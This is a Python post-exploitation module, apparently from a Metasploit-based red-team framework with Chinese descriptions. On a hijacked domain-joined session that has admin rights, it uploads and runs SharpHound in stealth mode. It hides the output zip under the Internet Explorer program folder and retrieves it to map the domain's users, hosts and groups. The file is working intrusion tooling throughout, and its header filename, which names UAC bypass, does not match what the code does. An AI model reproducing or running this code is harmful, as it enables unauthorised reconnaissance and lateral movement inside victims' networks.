# -*- coding: utf-8 -*-
# @File  : PostMulitMsfBypassUAC.py
# @Date  : 2019/3/15
# @Desc  :

#
#


import json
import time
import zipfile

from PostModule.lib.ModuleTemplate import TAG2CH, PostPythonModule
from PostModule.lib.MsfModule import MsfModule
from PostModule.lib.OptionAndResult import Option, register_options
from PostModule.lib.Session import Session


class PostModule(PostPythonModule):
    NAME = "获取Session所在域全景图"
    DESC = "模块用于获取Session所在域的全景信息(用户,主机,组),模块所需Session必须在域中.\n" \
           "请注意,模块运行时间与域的大小正相关"
    REQUIRE_SESSION = True
    MODULETYPE = TAG2CH.Discovery
    OPTIONS = register_options([
        Option(name='Threads', name_tag="扫描线程数", type='integer', required=True, desc="模块的扫描线程数(1-20)", default=10),
        Option(name='Domain', name_tag="域名称", type='str', required=False, desc="需要收集信息的域,如果为空则收集Session所在域",
               default=None),
    ])

    def __init__(self, sessionid, hid, custom_param):
        super().__init__(sessionid, hid, custom_param)

    def deal_zipfile(self, zippath):
        azip = zipfile.ZipFile(zippath)
        zipinfo_jsonlist = azip.namelist()
        for onejson in zipinfo_jsonlist:
            strjson = azip.read(onejson).decode('utf-8')
            if strjson.startswith(u'\ufeff'):  # 去除BOM头
                strjson = strjson.encode('utf8')[3:].decode('utf8')
            pyobject = json.loads(strjson)
            print(pyobject.get('meta'))
        pass

    def check(self):
        """执行前的检查函数"""

        self.session = Session(self._sessionid, uacinfo=True)
        if self.session.is_in_domain:
            pass
        else:
            return False, "选择的Session不在域中,请重新选择Session"

        # 检查权限
        if self.session.is_in_admin_group is not True:
            return False, "当前Session用户不在本地管理员组中,无法执行模块"
        threads = self.param('Threads')
        if 1 <= threads <= 20:
            pass
        else:
            return False, "扫描线程设置错误,请重新设置"
        self.clean_log()
        return True, None

    def run(self):
        # 设置参数
        opts = {}
        opts['LPATH'] = 'SharpHound.exe'
        opts['SESSION'] = self._sessionid
        opts['ARGS'] = ""
        if self.param('Domain') is None:
            domain_string = ""
        else:
            domain_string = "--Domain {}".format(self.param('Domain'))
        threads_string = "--Threads {}".format(self.param('Threads'))
        filename = "testteam{}.zip".format(int(time.time()))
        result_filepath = "{}/{}".format("C:/Program Files/Internet Explorer", filename)
        execute_string = " --CollectionMethod LoggedOn,All --Stealth --NoSaveCache --ZipFileName {} {} {}".format(
            result_filepath,
            domain_string, threads_string)
        opts['ARGS'] = execute_string
        self.log_status("信息收集阶段,执行中...")
        result = MsfModule.run_with_output(type='post', mname='multi/manage/upload_and_exec',
                                           opts=opts, _timeout=360)
        if result.find('Finished compressing files!') > 0:
            self.log_status("下载结果文件,执行中...")
            # filedata = self.session.download_file(result_filepath)
            self.log_good("下载文件完成,文件名: {}".format(filename))
        else:
            self.log_error("生成结果文件失败,退出执行.")
        # 调用父类函数存储结果(必须调用)
        self.log_status("执行完成")
